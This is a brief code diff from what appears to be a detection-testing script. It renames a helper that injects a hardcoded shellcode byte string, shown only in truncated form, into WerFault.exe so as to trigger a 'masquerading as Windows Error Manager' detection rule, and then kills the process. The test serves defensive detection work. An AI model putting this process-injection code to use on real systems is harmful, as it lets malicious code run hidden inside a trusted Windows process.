@@ -28,6 +28,6 @@ SHELLCODE = b"\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96\xAD\x8B\x
 )
 def main():
     # Inject shellcode into WerFault.exe to trigger <Potential Masquerading as Windows Error Manager>
-    _common.Inject("C:\\Windows\\SysWOw64\\WerFault.exe", SHELLCODE)
+    _common.inject_shellcode("C:\\Windows\\SysWOw64\\WerFault.exe", SHELLCODE)  # type: ignore
     # time.sleep(2)
     _ = _common.execute_command(["taskkill", "/f", "/im", "WerFault.exe"])
